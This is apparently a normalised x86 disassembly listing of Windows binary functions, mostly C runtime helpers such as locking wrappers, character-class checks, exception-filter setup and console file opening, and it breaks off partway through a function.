sub_40ead1
push 0xd
call sub_415ff7
pop ecx
retn
sub_40eadd
push 0xc
call sub_415ff7
pop ecx
retn
GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
GetCurrentThread
jmp [ GetCurrentThread@IAT ]
sub_40f4f2
push [ ebp + 0x8 ]
call sub_417609
pop ecx
retn
sub_40f680
mov eax [ rwxdata ]
push [ eax + esi * 4 ]
push esi
call sub_40deda
pop ecx
pop ecx
retn
sub_40f6af
push 0x1
call sub_415ff7
pop ecx
retn
sub_40f701
push [ ebp + 0x8 ]
call sub_40de9e
pop ecx
retn
sub_40f70b
push 0x1
call sub_40f5de
pop ecx
retn
sub_40fcc2
xor eax eax
inc eax
retn
sub_40fe6e
push [ ebp + 0x8 ]
call sub_417609
pop ecx
retn
sub_40fece
push 0x4
call sub_415ff7
pop ecx
retn
sub_410065
push [ ebp + 0x8 ]
call sub_417609
pop ecx
retn
sub_410238
mov eax ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_41029c
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
and [ eax + 0x8 ] 0x0
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_410371
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_40fe78
pop ecx
sub_410387
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_4103b2
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_4102b9
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4103cf
mov [ ecx ] r--data
jmp sub_410371
sub_4103f8
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_4102b9
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_410415
mov [ ecx ] r--data
jmp sub_410371
sub_410420
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_4103da
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41043d
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_4103f8
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41045a
mov [ ecx ] r--data
jmp sub_410371
sub_4104fb
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push ecx
call sub_4193a0
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41050f
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_419330
pop ecx
retn
sub_410540
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push ecx
call sub_419538
pop ecx
pop ecx
pop ebp
retn 0x4
sub_410556
push ecx
call sub_419495
pop ecx
retn
sub_4105c3
lea eax [ ecx + 0x8 ]
retn
sub_4105c7
mov eax ecx
mov [ eax ] r--data
retn 0x4
sub_4105d2
mov eax ecx
retn 0x4
sub_4105d7
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_40fe78
sub_410703
call sub_410a77
retn
sub_410709
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4106cd
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_410766
push 0x4
call sub_415ff7
pop ecx
retn
sub_4108b3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_4108f8
push 0x0
call sub_4108c2
pop ecx
retn
sub_410901
push [ rwxdata ]
call sub_40e714
pop ecx
retn
sub_4109c4
push sub_410982
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_410a56
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_410a2b
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_410a6e
push 0x8
call sub_4160e9
pop ecx
retn
sub_410a77
push 0x8
call sub_415ff7
pop ecx
retn
sub_410cd5
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_415ff7
pop ecx
sub_410cea
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_410bbe
add esp 0xc
pop ebp
retn
sub_410d00
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_410bbe
add esp 0xc
pop ebp
retn
sub_410d16
push 0x1
push 0x0
push 0x0
call sub_410bbe
add esp 0xc
retn
sub_410d25
push 0x1
push 0x1
push 0x0
call sub_410bbe
add esp 0xc
retn
sub_410fb0
retn
sub_4112a3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_41168a
xor eax eax
inc eax
retn
sub_411732
mov eax [ rwxdata ]
retn
sub_4117ce
and [ rwxdata ] 0x0
retn
sub_41196a
push [ ebp + 0x8 ]
call sub_417609
pop ecx
retn
sub_411ce2
push 0xd
call sub_415ff7
pop ecx
retn
sub_4120eb
push 0xd
call sub_415ff7
pop ecx
retn
sub_412124
cmp [ rwxdata ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_411f8a
pop ecx
mov [ rwxdata ] 0x1
sub_412142
mov eax [ rwxdata ]
retn
sub_412148
mov eax rwxdata
retn
sub_41248d
push 0xc
call sub_415ff7
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_412603
push 0xd
call sub_415ff7
pop ecx
retn
sub_41260f
push 0xc
call sub_415ff7
pop ecx
retn
sub_412618
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_412556
sub_4126bd
push 0xc
call sub_415ff7
pop ecx
retn
sub_4126c9
push 0xd
call sub_415ff7
pop ecx
retn
j_sub_412623
jmp sub_412623
sub_4126d7
xor eax eax
retn
sub_413270
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41317b
sub_4133a9
push 0xc
call sub_415ff7
pop ecx
retn
sub_4133b5
push 0xc
call sub_415ff7
pop ecx
retn
sub_4133e6
and [ esi + 0x70 ] 0xffffffef
retn
sub_413432
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ rwxdata ]
mov [ rwxdata ] ecx
pop ebp
retn
sub_413614
call sub_40dd54
add eax 0x20
push eax
push 0x1
call sub_40deda
pop ecx
pop ecx
retn
sub_413627
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42076d
add esp 0xc
pop ebp
retn
sub_413640
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42078a
add esp 0xc
pop ebp
retn
sub_413659
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0x0
push [ ebp + 0x8 ]
call sub_42078a
add esp 0xc
pop ebp
retn
sub_413671
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4207a7
add esp 0xc
pop ebp
retn
sub_41368a
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0x0
push [ ebp + 0x8 ]
call sub_4207a7
add esp 0xc
pop ebp
retn
sub_4136cc
mov eax [ rwxdata ]
or eax 0x1
xor ecx ecx
cmp [ rwxdata ] eax
sete cl
mov eax ecx
retn
sub_4139bf
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_413987
pop ecx
pop ecx
pop ebp
retn
sub_4139d2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x103
push [ ebp + 0x8 ]
call sub_420818
add esp 0xc
pop ebp
retn
sub_4139ec
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_4208a2
pop ecx
pop ecx
pop ebp
retn
sub_413a02
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_420818
add esp 0xc
pop ebp
retn
sub_413a19
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_4208a2
pop ecx
pop ecx
pop ebp
retn
sub_413a2c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x2
push [ ebp + 0x8 ]
call sub_420818
add esp 0xc
pop ebp
retn
sub_413a43
mov edi edi
push ebp
mov ebp esp
push 0x2
push [ ebp + 0x8 ]
call sub_4208a2
pop ecx
pop ecx
pop ebp
retn
sub_413a56
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x4
push [ ebp + 0x8 ]
call sub_420818
add esp 0xc
pop ebp
retn
sub_413a6d
mov edi edi
push ebp
mov ebp esp
push 0x4
push [ ebp + 0x8 ]
call sub_4208a2
pop ecx
pop ecx
pop ebp
retn
sub_413a80
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x80
push [ ebp + 0x8 ]
call sub_420818
add esp 0xc
pop ebp
retn
sub_413a9a
mov edi edi
push ebp
mov ebp esp
push 0x80
push [ ebp + 0x8 ]
call sub_4208a2
pop ecx
pop ecx
pop ebp
retn
sub_413ab0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x8
push [ ebp + 0x8 ]
call sub_420818
add esp 0xc
pop ebp
retn
sub_413ac7
mov edi edi
push ebp
mov ebp esp
push 0x8
push [ ebp + 0x8 ]
call sub_4208a2
pop ecx
pop ecx
pop ebp
retn
sub_413ada
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x10
push [ ebp + 0x8 ]
call sub_420818
add esp 0xc
pop ebp
retn
sub_413af1
mov edi edi
push ebp
mov ebp esp
push 0x10
push [ ebp + 0x8 ]
call sub_4208a2
pop ecx
pop ecx
pop ebp
retn
sub_413b04
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x107
push [ ebp + 0x8 ]
call sub_420818
add esp 0xc
pop ebp
retn
sub_413b1e
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_4208a2
pop ecx
pop ecx
pop ebp
retn
sub_413b34
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x157
push [ ebp + 0x8 ]
call sub_420818
add esp 0xc
pop ebp
retn
sub_413b4e
mov edi edi
push ebp
mov ebp esp
push 0x157
push [ ebp + 0x8 ]
call sub_4208a2
pop ecx
pop ecx
pop ebp
retn
sub_413b64
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x117
push [ ebp + 0x8 ]
call sub_420818
add esp 0xc
pop ebp
retn
sub_413b7e
mov edi edi
push ebp
mov ebp esp
push 0x117
push [ ebp + 0x8 ]
call sub_4208a2
pop ecx
pop ecx
pop ebp
retn
sub_413b94
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x20
push [ ebp + 0x8 ]
call sub_420818
add esp 0xc
pop ebp
retn
sub_413bab
mov edi edi
push ebp
mov ebp esp
push 0x20
push [ ebp + 0x8 ]
call sub_4208a2
pop ecx
pop ecx
pop ebp
retn
sub_413bbe
mov edi edi
push ebp
mov ebp esp
mov eax 0x80
cmp [ ebp + 0x8 ] ax
sbb eax eax
neg eax
pop ebp
retn
sub_413f6b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
pop ebp
retn
sub_415f4c
push 0x1
call sub_415ff7
pop ecx
retn
sub_415ff7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rwxdata ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_41600e
push [ esp + 0x4 ]
push 0x0
call [ FatalAppExitA@IAT ]
push 0xff
call sub_410a56
sub_4160e0
push 0xa
call sub_415ff7
pop ecx
retn
sub_416c3a
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416a0f
add esp 0x10
pop ebp
retn
sub_416dbe
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416c54
add esp 0x10
pop ebp
retn
sub_416dd8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_416e08
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_416e1f
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_40e351
retn
push 0x8
call [ SetLastError@IAT ]
sub_416f6b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_417089
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_416fc0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_4170d4
call eax
retn
sub_417232
push 0x3
call sub_415ff7
pop ecx
retn
sub_417278
push 0x3
call sub_415ff7
pop ecx
retn
sub_417398
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417281
add esp 0x10
pop ebp
retn
sub_417600
push 0xa
call sub_415ff7
pop ecx
retn
sub_417703
push 0xa
call sub_415ff7
pop ecx
retn
sub_4177c1
push 0xb
call sub_415ff7
pop ecx
retn
sub_4179b7
push [ ebp + 0x8 ]
call sub_417609
pop ecx
retn
sub_417b2b
push 0xc
push r--data
call sub_40e30c
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_40e351
retn
sub_417b48
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_417bdd
call sub_417b7b
mov [ rwxdata ] eax
xor eax eax
retn
sub_417bea
cmp [ rwxdata ] 0x0
jne r-xdata
mov eax [ rwxdata ]
sub eax 0x3
neg eax
sbb eax eax
not eax
and eax [ rwxdata ]
retn
xor eax eax
retn
sub_4192be
push [ ebp + 0x8 ]
call sub_417609
pop ecx
retn
sub_419397
push 0xe
call sub_415ff7
pop ecx
retn
sub_41948c
push 0xe
call sub_415ff7
pop ecx
retn
sub_4194fc
push 0xe
call sub_415ff7
pop ecx
retn
sub_41963e
push 0xe
call sub_415ff7
pop ecx
retn
sub_419691
push 0xe
call sub_415ff7
pop ecx
retn
sub_4197c2
push 0x4
call sub_415ff7
pop ecx
retn
sub_4197cb
push 0x8
push r--data
call sub_40e30c
call sub_40e99d
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_426a77
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_4197eb
xor eax eax
inc eax
retn
sub_41983b
xor eax eax
inc eax
retn
sub_41983f
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4197cb
sub_41984f
push sub_4197cb
call sub_40e699
pop ecx
mov [ rwxdata ] eax
retn
sub_419860
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
mov [ rwxdata ] eax
mov [ rwxdata ] eax
mov [ rwxdata ] eax
pop ebp
retn
sub_4198f9
push edi
call sub_415ff7
pop ecx
retn
sub_419950
push [ rwxdata ]
call sub_40e714
pop ecx
retn
sub_41995d
call sub_40e99d
add eax 0x64
retn
sub_419966
call sub_40e99d
add eax 0x60
retn
sub_419b67
push 0x0
call sub_415ff7
pop ecx
retn
sub_419d20
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_415ff7
pop ecx
sub_419d5c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_419ff2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_41a2de
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
pop ebp
retn
sub_41a2ed
mov eax [ rwxdata ]
retn
sub_41a346
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a35f
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a377
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a390
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a3a8
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a3c1
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a3d9
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x107
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a3f5
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x107
push [ ebp + 0x8 ]
push 0x0
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a410
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x103
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a42c
mov edi edi
push ebp
mov ebp esp
push 0x1
push 0x103
push [ ebp + 0x8 ]
push 0x0
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a447
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x117
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a463
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x117
push [ ebp + 0x8 ]
push 0x0
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a47e
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x157
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a49a
mov edi edi
push ebp
mov ebp esp
push 0x3
push 0x157
push [ ebp + 0x8 ]
push 0x0
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a4b5
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x10
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a4ce
mov edi edi
push ebp
mov ebp esp
push 0x2
push 0x10
push [ ebp + 0x8 ]
push 0x0
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a4e6
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a4ff
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a517
mov edi edi
push ebp
mov ebp esp
push 0x8
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a530
mov edi edi
push ebp
mov ebp esp
push 0x8
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_41a2f3
add esp 0x10
pop ebp
retn
sub_41a59d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_41a548
pop ecx
pop ecx
pop ebp
retn
sub_41a5b0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
add eax 0x8
sub_41abea
mov eax [ rwxdata ]
retn
sub_41abf0
call sub_40e99d
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ eax + 0xc8 ]
retn
mov edx [ rwxdata ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_412423
sub_41bbad
call sub_40e99d
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ eax + 0xac ]
retn
mov edx [ rwxdata ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_412423
sub_41bbd6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov eax [ eax + 0xac ]
pop ebp
retn
pop ebp
jmp sub_41bbad
sub_41bbf2
call sub_40e99d
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rwxdata ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_412423
sub_41bc18
call sub_40e99d
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ eax + 0x8 ]
retn
mov edx [ rwxdata ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_412423
sub_41bc3e
call sub_40e99d
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rwxdata ]
je r-xdata
add eax 0xc
retn
mov edx [ rwxdata ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_412423
sub_41bc64
xor eax eax
retn
sub_41bd67
push 0x0
call sub_41bc67
pop ecx
retn
sub_41be70
push 0x0
call sub_41bd70
pop ecx
retn
sub_41c1d0
push 0x0
call sub_41be79
pop ecx
retn
sub_41ccf6
call sub_40e99d
mov ecx [ eax + 0x6c ]
cmp ecx [ rwxdata ]
je r-xdata
mov eax [ rwxdata ]
retn
mov ecx [ rwxdata ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_412423
sub_41cdc8
or [ esi + 0x8 ] 0x104
call [ GetUserDefaultLCID@IAT ]
mov [ esi + 0x1c ] eax
mov [ esi + 0x18 ] eax
retn
sub_41d552
test eax eax
je r-xdata
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
sub_41d564
movzx eax [ eax ]
movzx ecx [ ecx ]
sub eax ecx
je r-xdata
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
sub_420250
push 0x2
call sub_410a02
pop ecx
retn
sub_420355
push 0x4
call sub_415ff7
pop ecx
retn
sub_4204bb
push 0x4
call sub_415ff7
pop ecx
retn
sub_420765
push esi
call sub_40de9e
pop ecx
retn
sub_42076d
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40ca3b
call sub_4206dd
add esp 0x10
pop ebp
retn
sub_42078a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_4152e6
call sub_4206dd
add esp 0x10
pop ebp
retn
sub_4207a7
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_413f80
call sub_4206dd
add esp 0x10
pop ebp
retn
sub_4207c4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_40ca3b
call sub_4206dd
add esp 0x10
pop ebp
retn
sub_4207e0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_4152e6
call sub_4206dd
add esp 0x10
pop ebp
retn
sub_4207fc
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_413f80
call sub_4206dd
add esp 0x10
pop ebp
retn
sub_420918
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_4208a2
sub_420c63
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_420a09
add esp 0x14
pop ebp
retn
sub_420cac
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
call sub_420a09
add esp 0x14
pop ebp
retn
sub_420f62
push [ ebp + 0x8 ]
call sub_417609
pop ecx
retn
sub_4211b6
push [ ebp + 0x8 ]
call sub_417609
pop ecx
retn
sub_421310
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0xc0000000
push r--data
call [ CreateFileA@IAT ]
mov [ rwxdata ] eax
retn
sub_42132f
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rwxdata ] eax
retn
sub_421ca1
mov eax [ rwxdata ]
not eax
and eax 0x1
retn
sub_421cac
mov eax [ rwxdata ]
shr eax 0x1
not eax
and eax 0x1
retn
sub_421cb9
mov eax [ rwxdata ]
shr eax 0x11
not eax
and eax 0x1
retn
sub_421cc7
mov eax [ rwxdata ]
shr eax 0x2
not eax
and eax 0x1
retn
sub_421cd5
mov eax [ rwxdata ]
shr eax 0x3
not eax
and eax 0x1
retn
sub_421ce3
mov eax [ rwxdata ]
shr eax 0x4
not eax
and eax 0x1
retn
sub_421cf1
mov eax [ rwxdata ]
and eax 0x60
xor ecx ecx
cmp al 0x60
setne cl
mov eax ecx
retn
sub_421d03
mov eax [ rwxdata ]
shr eax 0x7
not eax
and eax 0x1
retn
sub_421d11
mov eax [ rwxdata ]
shr eax 0x8
not eax
and eax 0x1
retn
sub_421d1f
mov eax [ rwxdata ]
shr eax 0x9
not eax
and eax 0x1
retn
sub_421d2d
mov eax [ rwxdata ]
and eax 0x1000
retn
sub_421d38
mov eax [ rwxdata ]
and eax 0x2000
retn
sub_421d43
mov eax [ rwxdata ]
and eax 0x4000
retn
sub_421d4e
mov eax [ rwxdata ]
shr eax 0xf
not eax
and eax 0x1
retn
sub_421d5c
mov eax [ rwxdata ]
and eax 0x10000
retn
sub_421d67
mov eax [ rwxdata ]
shr eax 0x12
not eax
and eax 0x1
retn
sub_421e1b
mov eax ecx
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
and [ eax + 0x4 ] 0xffff00ff
retn
sub_421e2c
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
sub_421e44
xor eax eax
cmp [ ecx + 0x4 ] 0x1
setle al
retn
sub_421e4e
xor eax eax
cmp [ ecx ] eax
sete al
retn
sub_421e56
movsx eax [ ecx + 0x4 ]
retn
sub_421e5b
mov eax ecx
or [ eax + 0x4 ] 0x100
retn
sub_421e65
mov eax [ ecx + 0x4 ]
shr eax 0x8
and eax 0x1
retn
sub_421e6f
xor eax eax
cmp [ ecx ] eax
je r-xdata
retn
test [ ecx + 0x4 ] 0x200
je r-xdata
inc eax
sub_421e80
cmp [ ecx ] 0x0
je r-xdata
retn
or [ ecx + 0x4 ] 0x200
sub_421e8d
xor eax eax
cmp [ ecx ] eax
je r-xdata
retn
test [ ecx + 0x4 ] 0x400
je r-xdata
inc eax
sub_421e9e
or [ ecx + 0x4 ] 0x800
retn
sub_421ea6
mov eax [ ecx + 0x4 ]
shr eax 0xb
and eax 0x1
retn
sub_421eb0
mov eax [ ecx + 0x4 ]
shr eax 0xc
and eax 0x1
retn
sub_421eba
or [ ecx + 0x4 ] 0x1000
retn
sub_421ec2
mov eax [ ecx + 0x4 ]
shr eax 0xd
and eax 0x1
retn
sub_421ecc
or [ ecx + 0x4 ] 0x2000
retn
sub_421ed4
mov eax [ ecx + 0x4 ]
shr eax 0xe
and eax 0x1
retn
sub_421ede
or [ ecx + 0x4 ] 0x4000
retn
sub_421ee6
mov eax [ ecx + 0x4 ]
shr eax 0xf
and eax 0x1
retn
sub_421ef0
or [ ecx + 0x4 ] 0x8000
retn
sub_421ef8
mov ecx [ ecx ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
jmp [ eax ]
xor eax eax
retn
sub_421f13
mov edi edi
push ebp
